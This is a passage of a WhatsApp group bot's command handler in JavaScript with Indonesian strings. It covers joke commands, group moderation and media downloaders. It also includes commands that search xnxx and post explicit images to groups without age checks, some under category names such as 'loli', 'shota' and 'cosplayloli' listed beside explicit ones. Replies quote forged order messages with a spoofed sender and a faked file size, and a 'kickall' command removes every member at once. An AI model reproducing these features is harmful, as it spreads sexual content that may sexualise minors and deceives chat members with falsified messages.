if (args.length < 1) return replyNya(`Contoh : ${prefix}bisakah aku terbang`)
query = args.join(" ")
naon = ['Iya','Tidak','Mungkin']
random = naon[Math.floor(Math.random() * (naon.length))]
tt = `Pertanyaan = ${command} ${query}
Jawaban : ${random}`
replyNya(tt)
break
case 'kapankah':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (args.length < 1) return replyNya(`Contoh : ${prefix}kapankah aku menikah`)
query = args.join(" ")
no = `${Math.floor(Math.random() * 100)}`
naon = ['Jam lagi','Hari lagi','Minggu lagi','Bulan lagi','Tahun lagi']
random = naon[Math.floor(Math.random() * (naon.length))]
kapan = `Pertanyaan = ${command} ${query}
Jawaban : ${no} ${random}`
replyNya(kapan)
break      	   
case 'rate':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (args.length < 1) return replyNya(`Contoh : ${prefix}rate aku ganteng`)
random = `${Math.floor(Math.random() * 100)}`
rating = `Persentase : ${random}%`
replyNya(rating)
break
case 'setppgc2': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) return replyNya(mess.group)
if (!isAdmins && !isCreator) return replyNya(mess.admin)
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var media = await kirbotz.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `'panjang'`) {
var { img } = await generateProfilePicture(media)
await kirbotz.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(media)
reply(`Sukses`)
} else {
var memeg = await kirbotz.updateProfilePicture(m.chat, { url: media })
fs.unlinkSync(media)
reply(`Sukses`)
}
}
break
case 'setppbot': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isCreator) return replyNya(mess.owner)
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var media = await kirbotz.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `'panjang'`) {
var { img } = await generateProfilePicture(media)
await kirbotz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(media)
reply(`Sukses`)
} else {
var memeg = await kirbotz.updateProfilePicture(botNumber, { url: media })
fs.unlinkSync(media)
reply(`Sukses`)
}
}
break
case 'setppgc': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await kirbotz.downloadAndSaveMediaMessage(quoted)
await kirbotz.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
replyNya(mess.success)
}
break
case 'setname': case 'setsubject': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Text ?'
await kirbotz.groupUpdateSubject(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'setdesc': case 'setdesk': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Text ?'
await kirbotz.groupUpdateDescription(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'add': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kirbotz.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'kick': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kirbotz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'kickall':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
for (let i of groupMembers) {
await kirbotz.groupParticipantsUpdate(m.chat, [i.jid], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'tagall': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (!q) throw `Teks?`
let teks = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : ''}\n`
for (let mem of participants) {
teks += `➲ @${mem.id.split('@')[0]}\n`
}
kirbotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: fakekirbotz })
}
break
case 'hidetag': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
kirbotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: fakekirbotz })
}
break
case 'promote': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (!isCreator && !isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kirbotz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'demote': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) throw mess.group
if (!isCreator && !isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kirbotz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.quoted && !text) throw `Kirim/Reply Teks Dengan Caption ${prefix + command}`
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
replyNya(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break
case 'jooxplay':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Example: ${prefix + command} Melukis Senja`)
sticWait(from)
                    query = args.join(" ")
                    ina = await fetchJson(`https://api.lolhuman.xyz/api/jooxplay?apikey=${lolkey}&query=${query}`)
                    ani = ina.result
                    ini_txt = `Title : ${ani.info.song}\n`
                    ini_txt += `Artists : ${ani.info.singer}\n`
                    ini_txt += `Duration : ${ani.info.duration}\n`
                    ini_txt += `Album : ${ani.info.album}\n`
                    ini_txt += `Uploaded : ${ani.info.date}\n`
                    ini_txt += `Lirik :\n ${ani.lirik}\n`
                    fol = await getBuffer(ani.image)
                    kirbotz.sendMessage(m.chat, { image: fol, caption: ini_txt }, { quoted: fakekirbotz})                  
                    get_audio = await getBuffer(ani.audio[0].link)
                    kirbotz.sendMessage(m.chat, {audio: get_audio, mimetype: 'audio/mpeg', fileName: `${ani.title}.mp3`}, { quoted : fakekirbotz })
                    break
case 'play':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length < 1) return replyNya(`Kirim perintah ${command} query\nContoh : ${command} dj sad`)
sticWait(from)
await sendPlay(from, q)
break
case 'ytmp4': case 'ytvideo': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let { ytv } = require('./Lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 1080p`
let quality = args[1] ? args[1] : '1080p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return replyNya('File Melebihi Batas '+util.format(media))
kirbotz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `✇ Title : ${media.title}\n✇ File Size : ${media.filesizeF}\n✇ Url : ${isUrl(text)}\n✇ Ext : MP4\n✇ Resolusi : ${args[1] || '360p'}` }, { quoted: fakekirbotz })
}
break
case 'ytmp3': case 'ytaudio': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let { yta } = require('./Lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(text, quality)
if (media.filesize >= 100000) return replyNya('File Melebihi Batas '+util.format(media))
kirbotz.sendImage(m.chat, media.thumb, `✇ Title : ${media.title}\n✇ File Size : ${media.filesizeF}\n✇ Url : ${isUrl(text)}\n✇ Ext : MP3\n✇ Resolusi : ${args[1] || '128kbps'}`, m)
kirbotz.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mp4', ptt:true, contextInfo:{externalAdReply:{
showAdAttribution: true,
                title: `Hai Kak ${pushname}`,
                body: `© 2022`,
                thumbnail: thumb,
mediaType:2,
mediaUrl: "https://youtu.be/b0CCKgVEhlk",
sourceUrl: "https://youtu.be/b0CCKgVEhlk"
                 }}}, { quoted: m })
            }
break
case 'speed':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
let timestamp = speed()
let latensi = speed() - timestamp
await sendBut5nya(`${latensi.toFixed(4)} _Detik_`)
}
break
case 'runtime':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
await sendBut5nya(`${runtime(process.uptime())}`)
}
break
case 'ping': case 'botstatus': case 'statusbot': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Detik_ \n ${oldd - neww} _Miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
replyNya(respon)
}
break
case 'ssweb':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!q) throw `Link Nya?`
sticWait(from)
kirbotz.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/ssweb?apikey=${lolkey}&url=${q}`}})
break
case 'xnxxsearch':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
                    if (args.length == 0) return replyNya(`Example: ${prefix + command} Japanese`)
                    sticWait(from)
                    query = args.join(" ")
                    csksyu = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=${lolkey}&query=${query}`)
                    csksyz = csksyu.result
                    ini_txt = ""
                    for (var x of csksyz) {
                        ini_txt = `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Uploader : ${x.uploader}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
anu = `${ini_txt}───────────────\n\n┌ ◪ *DOWNLOAD*
└ ${prefix}xnxxvideo [link]`
kirbotz.sendMessage(from, { text: anu }, { quoted: fakekirbotz })
break
              case 'spotifysearch':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
              if (!isPrem) return replyPremium(mess.premium)
                    if (args.length == 0) return replyNya(`Example: ${prefix + command} Melukis Senja`)
                    sticWait(from)
                    query = args.join(" ")
                    kirt = await fetchJson(`https://api.lolhuman.xyz/api/spotifysearch?apikey=${lolkey}&query=${query}`)
                    haye = kirt.result
                    ini_txt = ""
                    for (var x of haye) {
                        ini_txt = `Title : ${x.title}\n`
                        ini_txt += `Artists : ${x.artists}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Preview : ${x.preview_url}\n`
                    }
                    replyNya(ini_txt)
                    break
case 'xnxxvideo':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
sticWait(from)
                    query = args.join(" ")
                    kohr = await fetchJson(`https://api.lolhuman.xyz/api/xnxx?apikey=${lolkey}&url=${query}`)
                    kohl = kohr.result
                    ini_txt = `Title : ${kohl.title}\n`
                    ini_txt += `Duration : ${kohl.duration}\n`
                    ini_txt += `View : ${kohl.view}\n`
                    ini_txt += `Rating : ${kohl.rating}\n`
                    ini_txt += `Like : ${kohl.like}\n`
                    ini_txt += `Dislike : ${kohl.dislike}\n`
                    ini_txt += `Comment : ${kohl.comment}\n`
                    ini_txt += `Tag : ${kohl.tag.join(", ")}\n`
                    ini_txt += `Description : ${kohl.description}\n`
                    ini_txt += "Link : \n"
                    ini_link = kohl.link
                    for (var x of ini_link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    fott = await getBuffer(kohl.thumbnail)
                    await kirbotz.sendMessage(m.chat, { image: fott, caption: ini_txt }, { quoted: fakekirbotz})                  
                    break
case 'tiktokaudio':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!q) return reply(`Link Nya Kak`)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
let dedet = await caliph.downloader.tiktok(`${q}`)
krt = (dedet.audio)
reply(`Nih Kak Downlod Sendiri
${krt}`)
break
case 'tiktok': case 'tiktoknowm': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!text) throw 'Masukkan Query Link!'
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(`Link Error`)
sticWait(from)
let anu = await hxz.ttdownloader(args[0])
let message = await prepareWAMessageMedia({ video : { url: anu.nowm } }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
videoMessage: message.videoMessage,
hydratedContentText: `Download From ${text}`,
hydratedFooterText: `Klik Button Di Bawah`,
hydratedButtons: [{ urlButton: { displayText: 'Source Video', url: `${args[0]}` } },
{ quickReplyButton: { displayText: '⇄   ◃◃   ⅠⅠ   ▹▹   ↻', id: `${prefix}tiktokaudio ${args[0]}` } }]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'playmp3': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!text) throw 'Masukan Judul Nya!!!'
sticWait(from)
let anu = await akira.ytPlayMp3(text)
kirbotz.sendImage(m.chat, anu.thumb, `✇ Title : ${anu.title}
✇ Channel : ${anu.channel}
✇ Upload : ${anu.published}
✇ Views : ${anu.views}`, m)
kirbotz.sendMessage(m.chat, { audio: { url: anu.url }, mimetype: 'audio/mp4', ptt:true, contextInfo:{externalAdReply:{
showAdAttribution: true,
title: `Hai Kak ${pushname}`,
body: `© 2022`,
thumbnail: thumb,
mediaType:2,
mediaUrl: "https://youtu.be/b0CCKgVEhlk",
sourceUrl: "https://youtu.be/b0CCKgVEhlk"
}}}, { quoted: m })
}
break
case 'playmp4': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!text) throw 'Masukan Judul Nya!!!'
sticWait(from)
let anu = await akira.ytPlayMp4(text)
let message = await prepareWAMessageMedia({ video : { url: anu.url } }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
videoMessage: message.videoMessage,
hydratedContentText: `Title : ${anu.title}
Channel : ${anu.channel}
Upload : ${anu.published}
Views : ${anu.views}
Link Download : 
${anu.url}`,
hydratedFooterText: 'Jangan Lupa Subscribe YT : KirBotz`',
hydratedButtons: []
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'yts': case 'ytsearch':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length < 1) return replyNya(`Contoh:\n${command} bukti Virgoun`)
let list_rows = [];
let yts = require("yt-search")
const data = await yts(q);
for(let a of data.all) {
list_rows.push({
title: a.title, description: `Channel: ${a.author.name} | Durasi: ${a.duration}`, rowId: `${prefix}play ${a.url}`
})
}
    const button = {
        title: `Hasil Pencarian Dari ${q}`,
        description: "Silahkan Tap Tombol Dibawah!",
        footerText: `Create by KirBotz`,
        buttonText: 'Tap Disini!',
        listType: 'SINGLE_SELECT',
        sections: [
            {
                title: "Hasil Pencarian", 
                rows: list_rows
            }
        ]
        }
        const templateList = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ "listMessage": button }), {});
        kirbotz.relayMessage(m.chat, templateList.message, { messageId: templateList.key.id });
break
case 'hentai':
case 'ahegao2':
case 'ass':
case 'bdsm':
case 'cuckold':
case 'cum':
case 'ero':
case 'femdom':
case 'foot':
case 'gangbang':
case 'glasses':
case 'jahy':
case 'masturbation':
case 'orgy':
case 'panties':
case 'pussy':
case 'thighs':
case 'yuri':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
let cndn = await fetchJson(`https://raw.githubusercontent.com/jepribarus/JB-Api/main/nsfw/${command}.json`)
let random = cndn[Math.floor(Math.random() * cndn.length)]
kirbotz.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: fakekirbotz })
}
break
case 'wallpaperislami':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
let kcle = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Islamic.json`)
let random = kcle[Math.floor(Math.random() * kcle.length)]
kirbotz.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: fakekirbotz })
}
break
case 'wallpaperinori':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
let kuxe = await fetchJson(`https://raw.githubusercontent.com/qisyana/senku/main/storages/inori-pic.json`)
let random = kuxe[Math.floor(Math.random() * kuxe.length)]
kirbotz.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: fakekirbotz })
}
break
case 'wallpapercyber':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
let xpwl = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/CyberSpace.json`)
let random = xpwl[Math.floor(Math.random() * xpwl.length)]
kirbotz.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: fakekirbotz })
}
break
case 'exo': 
case 'islamic': 
case 'aesthetic': 
case 'akira': 
case 'akiyama': 
case 'ana': 
case 'anjing': 
case 'art2': 
case 'asuna': 
case 'ayuzawa': 
case 'randblackpink': 
case 'boneka': 
case 'boruto': 
case 'cecan2': 
case 'chiho': 
case 'chitoge': 
case 'cogan2': 
case 'cosplay': 
case 'cosplayloli': 
case 'cosplaysagiri': 
case 'cuckold': 
case 'cum': 
case 'cyber': 
case 'darkjokes': 
case 'deidara': 
case 'doraemon': 
case 'eba': 
case 'elaina': 
case 'emilia': 
case 'ero': 
case 'erza': 
case 'femdom': 
case 'foot': 
case 'freefire': 
case 'gamewallpaper': 
case 'gangbang': 
case 'gifs': 
case 'glasses': 
case 'gremory': 
case 'hekel': 
case 'hentai': 
case 'hestia': 
case 'hijaber': 
case 'hinata': 
case 'husbu': 
case 'inori': 
case 'isuzu': 
case 'itachi': 
case 'itori': 
case 'jahy': 
case 'jeni': 
case 'jiso': 
case 'justina': 
case 'kaga': 
case 'kagura': 
case 'kakasih': 
case 'kaori': 
case 'kartun': 
case 'katakata': 
case 'keneki': 
case 'kotori': 
case 'kpop': 
case 'kucing': 
case 'kurumi': 
case 'lisa': 
case 'loli': 
case 'madara': 
case 'masturbation': 
case 'megumin': 
case 'mikasa': 
case 'mikey': 
case 'miku': 
case 'milf': 
case 'minato': 
case 'mobil': 
case 'motor': 
case 'mountain': 
case 'naruto': 
case 'neko1': 
case 'neko2': 
case 'nekonime': 
case 'nezuko': 
case 'onepiece': 
case 'orgy': 
case 'panties': 
case 'pentol': 
case 'pokemon': 
case 'profil': 
case 'programming': 
case 'pubg': 
case 'pussy': 
case 'rize': 
case 'rose': 
case 'ryujin': 
case 'sagiri': 
case 'sakura': 
case 'sasuke': 
case 'satanic': 
case 'shina': 
case 'shinka': 
case 'shinomiya': 
case 'shizuka': 
case 'shota': 
case 'tatasurya': 
case 'technology': 
case 'tejina': 
case 'tentacles': 
case 'thighs': 
case 'toukachan': 
case 'tsunade': 
case 'waifu2': 
case 'wallhp': 
case 'wallml': 
case 'wallnime2': 
case 'yotsuba': 
case 'yuki': 
case 'yulibocil': 
case 'yumeko': 
case 'randomnime':
case 'randomnime2':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
reply(mess.wait)
const alalla = JSON.parse(fs.readFileSync(`./Database/penjon/${command}.json`));
const ranthumb = alalla[Math.floor(Math.random() * alalla.length)];
let buttoons = [
{buttonId: `${prefix+command}`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessaage = {
image: { url: ranthumb }, 
jpegThumbnail: ppnyauser,
caption: `Nih Kak @${sender.split("@")[0]}`,
fileLength: "999999999",
mentions:[sender],
footer: `_Powered By Akira_`,
buttons: buttoons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": 'Subscribe YT : KirBotz`', 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ',
"sourceUrl": 'https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ'
}}
}
kirbotz.sendMessage(m.chat, buttonMessaage, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6281903153426-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: 'Created By BloodSword',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
}
break
case 'waifu':
case 'husbu':
case 'milf':
case 'cosplay':
case 'wallml':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
let eek = await fetchJson(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)
let random = eek[Math.floor(Math.random() * eek.length)]
kirbotz.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: fakekirbotz })
}
break
case 'wallpaperteknologi':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
let toth = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Technology.json`)
let random = toth[Math.floor(Math.random() * toth.length)]
kirbotz.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: fakekirbotz })
}
break
case 'wallpaperanime':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
let tozs = await fetchJson(`https://raw.githubusercontent.com/qisyana/senku/main/storages/anime-wallpaper-pic.json`)
let random = tozs[Math.floor(Math.random() * tozs.length)]
kirbotz.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: fakekirbotz })
}
break
case 'wallpapergamer':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
let toew = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/GameWallp.json`)
let random = toew[Math.floor(Math.random() * toew.length)]
kirbotz.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: fakekirbotz })
}
break
case 'wallpaperprogamer':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
let xeke = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Programming.json`)
let random = xeke[Math.floor(Math.random() * xeke.length)]
kirbotz.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: fakekirbotz })
}
break
